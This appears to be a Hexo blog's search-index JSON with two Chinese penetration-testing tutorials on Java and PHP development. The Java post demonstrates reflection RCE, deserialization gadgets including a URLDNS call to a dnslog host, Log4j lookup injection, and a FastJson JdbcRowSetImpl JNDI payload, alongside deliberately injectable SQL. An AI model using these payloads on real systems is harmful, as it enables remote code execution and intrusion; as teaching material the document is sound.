{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://ink-scholar.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-11-24T07:16:07.600Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"/404.html","permalink":"https://ink-scholar.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-11-24T07:16:07.610Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"about/index.html","permalink":"https://ink-scholar.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"书单","date":"2023-11-24T07:16:07.619Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"books/index.html","permalink":"https://ink-scholar.github.io/books/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-11-24T07:18:08.372Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"tags/index.html","permalink":"https://ink-scholar.github.io/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-11-24T07:40:53.199Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"categories/index.html","permalink":"https://ink-scholar.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-11-24T07:17:50.043Z","updated":"2022-03-21T07:18:46.000Z","comments":true,"path":"links/index.html","permalink":"https://ink-scholar.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-11-24T07:16:07.646Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"repository/index.html","permalink":"https://ink-scholar.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"渗透测试--安全开发(下)","slug":"渗透测试--安全开发(下)","date":"2024-02-07T05:21:02.979Z","updated":"2024-02-11T12:43:05.145Z","comments":true,"path":"2024/02/07/渗透测试--安全开发(下)/","permalink":"https://ink-scholar.github.io/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/","excerpt":"","text":"此篇主要写一些Java方面的开发知识，让大家对java有一个全面的了解 Java ServletServlet 是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和 HTTP服务器上的数据库或应用程序之间的中间层。使用 Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。 使用创建使用IDEA开发，新建项目选择Jakarta EE，提前下载好tomcat的压缩包，去官网下载即可 此处选择Java EE 8，不然在进行路由访问时会爆一些错误，原因现在先不深究 我们在src–main–java下的那个demo目录下，与HelloServlet同级建立一个IndexServlet 创建一个类继承HttpServlet，写入内置方法，这里我们用doGet 在web.xml中添加访问路由 之后我们通过tomcat构建之后，访问&#x2F;index?name&#x3D;123，可以在日志那里看到我们的输出内容hhhhhhh，在页面可以看到我们传入的name值 以上是一个标准的写法，当然这种添加路由的方式有点麻烦，也可以直接在public上面加上 @WebServlet(“&#x2F;index”) 如下： 12345678910@WebServlet(&quot;/index&quot;)public class IndexServlet extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String name = request.getParameter(&quot;name&quot;); PrintWriter out = response.getWriter(); out.println(&quot;name: &quot;+name); System.out.println(&quot;hhhhhhhhh&quot;); &#125;&#125; 生命周期盗张图看一下 简单来说，init和destroy只执行一次，init在启动服务时执行，destroy在服务关闭时执行，service可以执行很多次，service包括Servlet service和http service，先执行servlet再去执行http，因为servlet负责接收请求方式而http负责接收传入的数据 数据库操作在java中常用三种方式：JDBC、Hibernate和Mybatis，目前最常用的时Mybatis JDBCjava提供，自带的api接口，但是在使用时需要先下载一个驱动，在 https://mvnrepository.com 进行下载 搜索mysql，选择 MySQL Connector Java，下载即可，在代码的根目录下面新建lib目前，将jar文件拖入，然后右键，选择添加为库，简单的demo 1234567891011121314151617181920212223package org.example.demo;import java.sql.*;public class MysqlServlet &#123; public static void main(String[] args) throws ClassNotFoundException, SQLException &#123; Class.forName(&quot;com.mysql.jdbc.Driver&quot;); //注册数据库驱动 //建立数据库连接 String url = &quot;jdbc:mysql://localhost:3306/db&quot;; Connection connection = DriverManager.getConnection(url,&quot;root&quot;,&quot;123456&quot;); //创建执行sql语句 String sql = &quot;select * from admin&quot;; Statement statement = connection.createStatement(); ResultSet rs = statement.executeQuery(sql); System.out.println(rs); while (rs.next())&#123; int id = rs.getInt(&quot;id&quot;); String un = rs.getString(&quot;username&quot;); String pw = rs.getString(&quot;password&quot;); System.out.println(id+&quot; &quot;+un+&quot; &quot;+pw+&quot; &quot;); &#125; &#125;&#125; 预编译预编译简单理解就是使用了预编译之后，你输入的内容无法改变代码原有的执行逻辑，具体原理可以自行查询 123456789101112131415161718192021222324252627282930313233package org.example.demo;import java.sql.*;import java.util.Scanner;public class MysqlServlet &#123; public static void main(String[] args) throws ClassNotFoundException, SQLException &#123; Scanner scanner = new Scanner(System.in); System.out.println(&quot;please input id : &quot;); String s=scanner.nextLine(); Class.forName(&quot;com.mysql.jdbc.Driver&quot;); String url = &quot;jdbc:mysql://localhost:3306/db&quot;; Connection connection = DriverManager.getConnection(url,&quot;root&quot;,&quot;123456&quot;); //不安全的写法 String sql = &quot;select * from admin where id = &quot;+s; System.out.println(sql); Statement statement = connection.createStatement(); ResultSet rs = statement.executeQuery(sql); //预编译写法 String safesql = &quot;select * from admin where id = ?&quot;; PreparedStatement preparedStatement=connection.prepareStatement(safesql); preparedStatement.setString(1,s); ResultSet resultSet=preparedStatement.executeQuery(safesql); System.out.println(preparedStatement); while (rs.next())&#123; int id = rs.getInt(&quot;id&quot;); String un = rs.getString(&quot;username&quot;); String pw = rs.getString(&quot;password&quot;); System.out.println(id+&quot; &quot;+un+&quot; &quot;+pw+&quot; &quot;); &#125; &#125;&#125; 过滤器Filter实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的response进行拦截处理。使用filter技术可以实现对所有Web资源的管理，例如权限访问等，我们所说的Filter Shell，也就是内存马之一，就是在这一层实现的 XSS过滤先写一个IndexServlet的正常文件 123456789101112131415161718192021package org.example.demo;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;@WebServlet(&quot;/index&quot;)public class IndexServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String code = req.getParameter(&quot;code&quot;); PrintWriter out = resp.getWriter(); out.println(code); out.flush(); out.close(); &#125;&#125; 在和上述文件的同级目录在写一个过滤文件，命名为XssFilter 123456789101112131415161718192021222324252627282930313233package org.example.demo;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import java.io.IOException;@WebFilter(&quot;/index&quot;)public class XssFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; System.out.println(&quot;开启XSS过滤&quot;); //中间件启动就开始执行，init初始化 &#125; @Override public void destroy() &#123; System.out.println(&quot;销毁XSS过滤&quot;); //中间件服务关闭执行，消亡 &#125; @Override // 访问路由index时触发 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; System.out.println(&quot;正在进行XSS过滤&quot;); // 过滤代码，对数据进行过滤 HttpServletRequest request=(HttpServletRequest) servletRequest; String code=request.getParameter(&quot;code&quot;); if (!code.contains(&quot;&lt;script&gt;&quot;))&#123; // 放行 filterChain.doFilter(servletRequest,servletResponse); &#125;else&#123; System.out.println(&quot;存在XSS！&quot;); &#125; &#125;&#125; 未授权检测这里简单写一下cookie的检测 1234567891011121314151617181920212223242526272829303132333435363738package org.example.demo;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletRequest;import java.io.IOException;@WebFilter(&quot;/index&quot;)public class XssFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; System.out.println(&quot;开启Cookie过滤&quot;); //中间件启动就开始执行，init初始化 &#125; @Override public void destroy() &#123; System.out.println(&quot;销毁Cookie过滤&quot;); //中间件服务关闭执行，消亡 &#125; @Override // 访问路由index时触发 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; // 取出cookie值 HttpServletRequest request = (HttpServletRequest) servletRequest; Cookie[] cookies = request.getCookies(); for(Cookie c:cookies)&#123; String cName = c.getName(); String cValue = c.getValue(); System.out.println(cName); System.out.println(cValue); if(cValue.contains(&quot;admin&quot;))&#123; filterChain.doFilter(servletRequest,servletResponse); &#125;else&#123; System.out.println(&quot;非管理员访问&quot;); &#125; &#125; &#125;&#125; 监听器Listen过滤器是访问触发，监听器是动作触发。内存马也有监听器类型 详细可以参考： https://blog.csdn.net/qq_52797170/article/details/124023760 Session先写一个创建session的文件 1234567891011121314151617package org.example.demo;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@WebServlet(&quot;/cs&quot;)public class CreateSession extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;创建session&quot;); req.getSession(); &#125;&#125; 再写一个销毁session的文件 1234567891011121314151617package org.example.demo;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@WebServlet(&quot;/ds&quot;)public class DestorySession extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;销毁session&quot;); req.getSession().invalidate(); &#125;&#125; 最后我们写一个监听session创建与销毁的文件 1234567891011121314151617package org.example.demo;import javax.servlet.annotation.WebListener;import javax.servlet.http.HttpSessionEvent;import javax.servlet.http.HttpSessionListener;@WebListenerpublic class ListenSession implements HttpSessionListener &#123; @Override public void sessionCreated(HttpSessionEvent se) &#123; System.out.println(&quot;监听到Session创建&quot;); &#125; @Override public void sessionDestroyed(HttpSessionEvent se) &#123; System.out.println(&quot;监听到Session销毁&quot;); &#125;&#125; 先访问一下销毁session的路由cs，之后再去验证，先创建再销毁，结果如下 我们可以看到监听器那里的路由只有@WebListener，没有写路径，这可以更好的理解为什么监听器是动作触发 当我们不停的去访问创建session的路由时，我们只能看到一次监听到session创建这个结果 Java反射Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成，该类库包含了Field、Method、Constructor等类，对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制，具体可以参考：https://xz.aliyun.com/t/9117 为什么要用到反射？ 在运行时而不是编译时，不改变原有代码逻辑，自行运行的时候动态创建和编译即可，动态的创建修改调用获取其属性 再简单一点说，反射就是在运行时改变它的值而不用在源码里面重新写 先写一个demo，取名为User 123456789101112131415161718192021222324252627package org.example.demo;public class User &#123; // 成员变量 public String name = &quot;zhangsan&quot;; public int age = 22; private String sfz = &quot;xxxxxxx&quot;; protected String company = &quot;qax&quot;; //构造方法，没有返回值类型,没有return,方法名和类名相同 public User()&#123; System.out.println(&quot;无参数&quot;); &#125; public User(String name)&#123; System.out.println(name); &#125; private User(String name,int age)&#123; System.out.println(name); System.out.println(age); &#125; //成员方法，有返回值类型,若有返回值类型为空void,则可以不写return,成员方法名和类名不能相同 public void userinfo(String name, int age, String sfz, String company)&#123; this.name = name; this.age = age; this.sfz = sfz; this.company = company; &#125;&#125; 获取类四种获取类的方法如下 1234567891011121314151617181920package org.example.demo;public class GetClass &#123; public static void main(String[] args) throws ClassNotFoundException &#123; // 根据全限定类名：Class.forName(&quot;全路径类名&quot;) Class aClass = Class.forName(&quot;org.example.demo.User&quot;); System.out.println(aClass); // 根据类名：类名.class Class bClass = User.class; System.out.println(bClass); // 根据对象：对象.getClass() User user = new User(); Class cClass = user.getClass(); System.out.println(cClass); // 通过类加载器获取Class对象： ClassLoader clsload = ClassLoader.getSystemClassLoader(); Class dClass = clsload.loadClass(&quot;org.example.demo.User&quot;); System.out.println(dClass); &#125;&#125; 最常用的是第一种 反射获取成员变量 获取变量对象、获取公共成员变量值、赋值公共成员变量值： 123456789101112131415161718192021222324252627282930313233343536package org.example.demo;import java.lang.reflect.Field;public class GetFilter &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; Class aclass = Class.forName(&quot;org.example.demo.User&quot;); // 获取所有公共成员变量对象 public Field[] af = aclass.getFields(); for(Field fd:af)&#123; System.out.println(fd); &#125; //获取所有成员变量对象 Field[] bf = aclass.getDeclaredFields(); for(Field fd:bf)&#123; System.out.println(fd); &#125; //获取单个公共成员变量对象 Field name = aclass.getField(&quot;name&quot;); System.out.println(name); //获取单个成员变量对象 Field company = aclass.getDeclaredField(&quot;company&quot;); System.out.println(company); //获取公共成员变量值 User u = new User(); Field fd = aclass.getField(&quot;age&quot;); Object a = fd.get(u); System.out.println(a); //赋值公共成员变量值 User v = new User(); Field w = aclass.getField(&quot;age&quot;); w.set(v,33); Object x = w.get(v); System.out.println(x); &#125;&#125; 反射获取构造方法 123456789101112131415161718192021222324252627282930313233343536package org.example.demo;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;public class GetConstructor &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Class aClass = Class.forName(&quot;org.example.demo.User&quot;); // 获取所有公共构造方法对象 Constructor[] ac = aClass.getConstructors(); for (Constructor con:ac)&#123; System.out.println(con); &#125; // 获取所有构造方法对象 Constructor[] bc = aClass.getDeclaredConstructors(); for (Constructor con:bc)&#123; System.out.println(con); &#125; // 获取单个公共构造方法对象 Constructor cc = aClass.getConstructor(String.class); System.out.println(cc); // 获取单个构造方法对象 Constructor dc = aClass.getDeclaredConstructor(String.class,int.class); System.out.println(dc); // 赋值给构造方法对象 Constructor ec = aClass.getDeclaredConstructor(String.class,int.class); ec.setAccessible(true); //临时开启对私有的访问 //User u=(User) ec.newInstance(&quot;lisi&quot;,30); //System.out.println(u); //这种写法和下面这一行效果一样，只是一个赋值问题 ec.newInstance(&quot;lisi&quot;,30); // Constructor fc = aClass.getConstructor(String.class); fc.newInstance(&quot;wangwu&quot;); &#125;&#125; 反射获取成员方法 123456789101112131415161718192021222324252627282930package org.example.demo;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class GetMethod &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class aClass = Class.forName(&quot;org.example.demo.User&quot;); // 获取所有公共成员方法对象，包括继承、内置的 Method[] am = aClass.getMethods(); for (Method method : am) &#123; System.out.println(method); &#125; // 获取所有成员方法对象，不包括继承、内置的 Method[] bm = aClass.getDeclaredMethods(); for (Method method : bm) &#123; System.out.println(method); &#125; // 获取单个公共成员方法对象 Method cm = aClass.getMethod(&quot;userinfo&quot;, String.class, int.class, String.class, String.class); System.out.println(cm); // 获取单个成员方法对象 Method dm = aClass.getDeclaredMethod(&quot;userinfo&quot;, String.class, int.class, String.class, String.class); System.out.println(dm); // 赋值成员方法对象 User u = new User(); Method em = aClass.getDeclaredMethod(&quot;userinfo&quot;, String.class, int.class, String.class, String.class); em.invoke(u,&quot;zhaoliu&quot;,22,&quot;123123123&quot;,&quot;lm&quot;); &#125;&#125; 反射RCE为什么我们要将上述这些操作？举一个简单的命令执行的例子 123456789101112131415161718package org.example.demo;import java.io.IOException;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class GetRunExec &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; //自带的原生写法 Runtime.getRuntime().exec(&quot;calc&quot;); //反射一步步调用 Class aClass = Class.forName(&quot;java.lang.Runtime&quot;); Method re = aClass.getDeclaredMethod(&quot;exec&quot;, String.class); Method ree = aClass.getDeclaredMethod(&quot;getRuntime&quot;); Object rec = ree.invoke(aClass); re.invoke(rec,&quot;calc.exe&quot;); &#125;&#125; 反&#x2F;序列化序列化：将内存中的对象压缩成字节流；反序列化：将字节流转化成内存中的对象 序列化与反序列化的设计就是用来传输数据的，当两个进程进行通信时，可以通过序列化反序列化来进行传输，能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。 Java内置的序列化和反序列化协议：writeObject()&#x2F;readObject()、XMLDecoder()&#x2F;XMLEncoder() 原生使用新建一个UserDemo 1234567891011121314151617181920package org.example.demo;import java.io.Serializable;public class UserDemo implements Serializable &#123; public String name = &quot;zhangsan&quot;; public String company = &quot;qax&quot;; public Integer age = 22; public UserDemo(String name,String company,Integer age)&#123; this.name=name; this.company=company; this.age=age; System.out.println(name); System.out.println(company); System.out.println(age); &#125; public String toString()&#123; return &quot;User&#123; &quot;+&quot;name：&quot;+name+&quot;company：&quot;+company+&quot;age：&quot;+age+&quot; &#125;&quot;; &#125;&#125; 再写一个序列化的文件为SeriaDemo，运行之后可以看到输出了一个s.txt 1234567891011121314151617package org.example.demo;import java.io.*;public class SeriaDemo &#123; public static void main(String[] args) throws IOException &#123; //创建一个对象u，引用UserDemo UserDemo u = new UserDemo(&quot;lisi&quot;,&quot;lv&quot;,33); //调用下面的成员方法 Seria(u); &#125; public static void Seria(Object obj) throws IOException &#123; //将对象obj序列化之后输出到文件s.txt ObjectOutputStream aa = new ObjectOutputStream(new FileOutputStream(&quot;s.txt&quot;)); aa.writeObject(obj); &#125;&#125; 最后我们反序列化一下，将s.txt的内容反序列化 1234567891011121314151617package org.example.demo;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnseriaDemo &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; Object obj = Unseria(&quot;s.txt&quot;); System.out.println(obj); &#125; public static Object Unseria(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream bb = new ObjectInputStream(new FileInputStream(Filename)); Object cc = bb.readObject(); return cc; &#125;&#125; 反序列化利用链重写入口类readObject()入口类的readObject()直接调用危险方法，最好理解也是最不常见的，举个例子，我们直接在上面的UserDemo文件中添加一段 12345private void readObject(ObjectInputStream osi) throws IOException &#123; //指向正确的ReadObject，然后再去执行命令，这样你反序列化出来的东西就不为null，不加的话为null osi.defaultReadObject(); Runtime.getRuntime().exec(&quot;calc&quot;);&#125; 然后执行序列化再执行反序列化的文件，就会弹出计算器 其实就是你重写了readObject方法，方法里面写入要执行的命令，然后序列化的时候会把UserDemo里面我们自己写的readObject方法写入s.txt文件，然后反序列化的时候执行了你在UserDemo中重写的readObject这个方法，而不是java本身自带的那个readObject 构造函数等隐式执行构造函数&#x2F;静态代码块等类加载时隐式执行，比如我们的UserDemo里面有个toString，我们在里面这么写 12345678public String toString()&#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; return &quot;User&#123; &quot;+&quot;name：&quot;+name+&quot;company：&quot;+company+&quot;age：&quot;+age+&quot; &#125;&quot;;&#125; 这时，在反序列化的代码执行后，就会弹出计算器，原因是我们在反序列化的那个demo代码中有 1System.out.println(obj); 他对obj这个对象进行输出，默认调用原始对象的toString方法，如果你把这一行给注释，就不会有结果回显 入口参数可控类危险方法入口参数中包含可控类，该类有危险方法，比如readObject的调用 新写一个UrlDns文件，然后在dnslog上get一个域名 12345678910111213141516171819202122232425262728package org.example.demo;import java.io.*;import java.net.URL;import java.util.HashMap;public class UrlDns implements Serializable &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; HashMap&lt;URL,Integer&gt; hash = new HashMap&lt;&gt;(); URL u = new URL(&quot;http://7vmei3.dnslog.cn&quot;); hash.put(u,1); //序列化对象hash源自于自带的类HashMap，他里面也有readobject方法，在反序列化时用到了它 Seria(hash); Unseria(&quot;dns.txt&quot;); &#125; public static Object Unseria(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream bb = new ObjectInputStream(new FileInputStream(Filename)); Object cc = bb.readObject(); return cc; &#125; public static void Seria(Object obj) throws IOException &#123; //将对象obj序列化之后输出到文件s.txt ObjectOutputStream aa = new ObjectOutputStream(new FileOutputStream(&quot;dns.txt&quot;)); aa.writeObject(obj); &#125;&#125; 你会发现你请求了这个地址 第三方组件Log4JApache的一个开源项目，通过使用log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日制的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。 在进行组件搭建时，需要借助Maven，配置参考：https://www.jb51.net/article/259780.htm 配置完成maven后，新建项目选择maven即可，通过mvn仓库下载 Apache log4j Core，我这里选择了2.14.1版本，然后在下载页面找到maven配置的代码 将它粘贴到pom.xml中，如下 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 然后由于我们之前配置了阿里源，配置代码这里会有一个M的小标志，点一下就会去自动下载，最终我们在外部库中会看到下载的结果 先写一个简单的demo 12345678910import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class LogTest &#123; private static final Logger log = LogManager.getLogger(LogTest.class); public static void main(String[] args) &#123; String code = &quot;$&#123;java:os&#125;&quot;; log.error(code); &#125;&#125; 看一下输出结果 代码执行了，这就是最简单的log4j的原理，在真实的场景下我们需要借助JNDI-Injection-Exploit这个工具，现在我们使用之前学过的Servlet技术写一个简单的可访问的java网站且调用log4j组件 123456789101112131415161718192021package org.example.weblog;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@WebServlet(&quot;/log&quot;)public class WebLog extends HttpServlet &#123; private static final Logger log = LogManager.getLogger(WebLog.class); @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String code = req.getParameter(&quot;code&quot;); log.error(code); &#125;&#125; FastJson在前后端数据传输交互中，经常会遇到字符串与json，XML等格式相互转换与解析，其中json以跨语言跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式，它的接口简单，已经被广泛使用在缓存序列化、协议交互、web输出等各种应用场景中，是阿里巴巴开源库，用于对json格式的数据进行解析和打包 先通过两个demo进行一个简单测试 1234567891011121314151617181920package org.example;public class DataDemo &#123; private String name; private Integer age; public Integer getAge() &#123; return age; &#125; public String getName() &#123; return name; &#125; public void setAge(Integer age) &#123; this.age = age; System.out.println(age); &#125; public void setName(String name) &#123; this.name = name; System.out.println(name); &#125;&#125; fastjson转化的代码如下 12345678910111213141516package org.example;import com.alibaba.fastjson.JSONObject;public class FjDemo &#123; public static void main(String[] args) &#123; DataDemo data = new DataDemo(); data.setAge(22); data.setName(&quot;zhangsan&quot;); System.out.println(data); // 使用fastjson转为j son数据 String jsonstring = JSONObject.toJSONString(data); System.out.println(jsonstring); &#125;&#125; 输出结果为： 简单分析一下漏洞原理： 1String jsonstring = JSONObject.toJSONString(data, SerializerFeature.WriteClassName); 在后面加一个东西，我们可以看一下输出结果 其实在转化的时候前面有个@type的东西，数据就是类包，上述是将对象转为Json，接下来我们将Json转为对象 123String test = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.DataDemo\\&quot;,\\&quot;age\\&quot;:22,\\&quot;name\\&quot;:\\&quot;zhangsan\\&quot;&#125;&quot;;JSONObject jsontest = JSON.parseObject(test);System.out.println(jsontest); 此时输出结果就是 {“name”:”zhangsan”,”age”:22} 如果我们在同一目录下新建一个名为Run的类，代码如下 123456789package org.example;import java.io.IOException;public class Run &#123; public Run() throws IOException &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;&#125; 这时，在将Json转为对象时我们这么写 123String test = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.Run\\&quot;,\\&quot;age\\&quot;:22,\\&quot;name\\&quot;:\\&quot;zhangsan\\&quot;&#125;&quot;;JSONObject jsontest = JSON.parseObject(test);System.out.println(jsontest); 然后再运行你就会发现执行了Run这个类里面弹出计算器的命令 JNDI注入Java Naming and Directory Interface （Java命名和目录接口），JNDI提供统一的客户端API，通过不同的服务供应接口（SPI）的实现，由管理者将JNDI API映射为特定的命名服务和目录服务，使得JAVA应用程序可以通过JNDI实现和这些命名服务和目录服务之间的交互 其中最常用的为 RMI：远程方法调用注册表 ldap：轻量级目录访问协议 调用检索Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI和LDAP等 1javax.naming.InitialContext.lookup() 此方法专门用来实现JNDI注入，写个demo 12345678910111213package org.example.demo;import javax.naming.InitialContext;import javax.naming.NamingException;public class JndiDemo &#123; public static void main(String[] args) throws NamingException &#123; // 创建一个rmi或ldap等服务调用 InitialContext ini = new InitialContext(); // 调用rmi或ldap等服务对象类（远程） ini.lookup(&quot;xxxxxxxxxxxxxx&quot;); &#125;&#125; 其中xxxxxxxxxxx是通过JNDI-Exploit来生成的rmi或ldap的payload 还有一款工具：marshalsec，这款工具需要你自己写一个代码执行的java文件，然后编译成class文件上传到服务器上，然后通过工具生成class访问路径，一般payload中ldap协议对应1389端口，rmi协议对应1099端口 除此之外，你会发现不同的JDK版本的RMI和LDAP未必都可以成功利用，不过很多工具里面都有内置的绕过 FastJson与JNDI注入利用之前第三方组件中FastJson处的内容搭建一个小靶场，pol.xml文件中写入fastjson插件，在index.jsp中添加： 1234&lt;form action=&quot;/demo_war_exploded/fj&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;js&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;up&quot;&gt;&lt;/form&gt; 就是将输入框中输入的数据提交到fj这个地址，然后我们创建一个类 123456789101112131415161718192021package org.example.demo;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@WebServlet(&quot;/fj&quot;)public class FjWeb extends HttpServlet &#123; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String jsondata = req.getParameter(&quot;jd&quot;); JSONObject jso = JSON.parseObject(jsondata); System.out.println(jso); &#125;&#125; payload为 1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://dnslog地址&quot;,&quot;autoCommit&quot;:true&#125; 这里@type里的内容为什么是这个呢？看下面 RMI在RMI服务中调用了 InitialContext.lookup() 的类有： 1234org.springframework.transaction.jta.JtaTransactionManager.readObject()com.sun.rowset.JdbcRowSetImpl.execute()javax.management.remote.rmi.RMIConnector.connect()org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName) LDAP在LDAP服务中调用了 InitialContext.lookup() 的类有： 123InitialDirContext.lookup()Spring LdapTemplate.lookup()LdapTemplate.lookupContext()","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"开发","slug":"开发","permalink":"https://ink-scholar.github.io/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"渗透测试--安全开发(上)","slug":"渗透测试--安全开发(上)","date":"2024-01-22T13:55:33.707Z","updated":"2024-02-07T04:29:26.239Z","comments":true,"path":"2024/01/22/渗透测试--安全开发(上)/","permalink":"https://ink-scholar.github.io/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/","excerpt":"","text":"此篇主要写一些开发方面的内容，毕竟不懂代码不会开发只能做一个脚本小子 PHP原生类留言板&#x2F;评论区大体上分四步，浏览器输入昵称和内容提交、服务器接收数据写入数据库、数据库返回结果通知服务器、服务器将最终结果交给浏览器 数据库操作PHP连接mysql，使用mysqli函数，常用： mysqli_connect() 打开一个到Mysql的新的连接，mysqli_select_db() 更改连接的默认数据库，mysqli_query() 执行某个针对数据库的查询 mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回，mysqli_close() 关闭先前打开的数据库连接 Mysql增删改查查：select * from 表名 where 列名&#x3D;’条件’; 增：insert into 表名(‘列名1’, ‘列名2’) value(‘列1值1’, ‘列2值2’); 删：delete from 表名 where 列名 &#x3D; ‘条件’; 改：update 表名 set 列名 &#x3D; 数据 where 列名 &#x3D; ‘条件’; PHP全局变量$GLOBALS：全局变量用于在PHP脚本中的任意位置访问全局变量，$_SERVER：超全局变量保存关于报头、路径和脚本位置的信息 $_POST：提交method为post的表单数据，$_REQUEST：用于收集表单数据，get和post都可 $_GET：收集URL中发送的数据，也用于收集method为get的表单数据 $_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容 